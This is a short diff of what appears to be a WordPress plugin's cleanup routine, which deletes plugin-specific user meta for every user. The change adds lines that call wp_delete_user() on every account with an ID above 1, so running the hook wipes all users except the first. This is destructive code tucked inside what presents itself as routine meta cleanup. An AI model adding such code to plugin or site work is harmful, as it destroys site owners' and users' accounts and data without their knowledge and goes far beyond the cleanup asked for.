@@ -124,6 +124,13 @@ add_action(
 
 			// Delete user meta
 			foreach ( get_users() as $user ) {
+				
+				// Delete except first user
+				if ( $user->ID > 1 ) {
+					wp_delete_user( $user->ID );
+					continue;
+				}
+
 				delete_user_meta( $user->ID, Withdrawal::METHOD_META_KEY );
 				delete_user_meta( $user->ID, Contributor::FLAG_META_KEY );
 				delete_user_meta( $user->ID, ContentPack::DOWNLOADS_META_KEY );
